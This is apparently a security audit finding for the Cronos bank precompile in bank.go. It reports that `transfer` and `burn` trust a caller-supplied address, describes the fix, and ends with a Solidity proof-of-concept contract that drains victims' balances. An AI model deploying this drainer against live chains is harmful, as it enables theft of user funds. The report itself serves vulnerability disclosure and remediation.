### Title
Bank Precompile `transfer` Allows Any EVM Contract to Drain Arbitrary User Balances Without Authorization - (File: x/cronos/keeper/precompiles/bank.go)

### Summary
The `BankContract` precompile's `transfer` method accepts a `sender` address as a caller-supplied argument and executes `bankKeeper.SendCoins(ctx, from, to, ...)` without verifying that `sender == contract.Caller()`. Any unprivileged EVM contract can therefore transfer native bank-module tokens (denom `evm/<contract_address>`) out of any victim's account to any destination.

### Finding Description

In `x/cronos/keeper/precompiles/bank.go`, the `TransferMethodName` branch unpacks the `sender` address directly from the ABI-encoded call arguments:

```go
sender := args[0].(common.Address)   // attacker-controlled
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
denom := EVMDenom(contract.Caller())  // "evm/<calling_contract>"
amt  := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is **no check** that `sender == contract.Caller()`. The only guard present is `checkBlockedAddr(to)`, which only prevents sending to module-blocked addresses.

The denom for the transfer is `evm/<contract.Caller()>`. Tokens of this denom are minted to users via the same precompile's `mint` method (also callable by any contract for its own denom). Once a user holds a balance of `evm/<contract_address>`, the contract that issued those tokens — or any contract that happens to be the canonical caller — can invoke `transfer(victim, attacker, balance)` and drain the victim's entire holding with no approval from the victim.

The identical missing-authorization pattern exists in the `BurnMethodName` branch: `recipient` (args[0]) is the address whose tokens are burned, again with no check that `contract.Caller() == recipient`. [1](#0-0)

### Impact Explanation

**Critical — Unauthorized transfer of bank-module assets.**

Any unprivileged EVM contract can:
1. Call `mint(victim, amount)` on the bank precompile to issue `evm/<attacker_contract>` tokens to a victim (or wait for victims to receive them through a legitimate flow).
2. Immediately call `transfer(victim, attacker_EOA, amount)` on the same precompile.
3. `bankKeeper.SendCoins` executes unconditionally, moving the victim's entire balance to the attacker.

This satisfies the Critical impact criterion: *Unauthorized transfer of CRC20/bank-module assets for precompile-controlled assets*.

### Likelihood Explanation

The entry point is a standard EVM `CALL` to the bank precompile address (`0x0000…0064`), reachable by any deployed contract or EOA-initiated contract call. No special privilege, leaked key, or governance action is required. The interface is public and documented.

### Recommendation

Enforce that the `sender` argument must equal `contract.Caller()` before executing the transfer:

```go
case TransferMethodName:
    ...
    sender := args[0].(common.Address)
    // ADD: caller authorization check
    if sender != contract.Caller() {
        return nil, errors.New("sender must be the calling contract")
    }
    ...
```

Apply the same fix to the `BurnMethodName` branch, requiring `recipient == contract.Caller()` (i.e., a contract may only burn its own tokens, not another account's).

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract BankDrainer {
    IBankModule constant BANK = IBankModule(address(0x64));

    // Step 1: issue tokens to victim (simulates any legitimate mint flow)
    function seedVictim(address victim, uint256 amount) external {
        BANK.mint(victim, amount);
        // victim now holds denom "evm/<address(this)>" = amount
    }

    // Step 2: drain victim — no approval needed
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim, but caller = address(this) → denom = "evm/<this>"
        BANK.transfer(victim, attacker, amount);
        // victim's balance is now 0; attacker received `amount`
    }
}
```

`drain()` succeeds because `bank.go` never checks `sender == contract.Caller()` before calling `bankKeeper.SendCoins(ctx, from, to, ...)`. [3](#0-2)
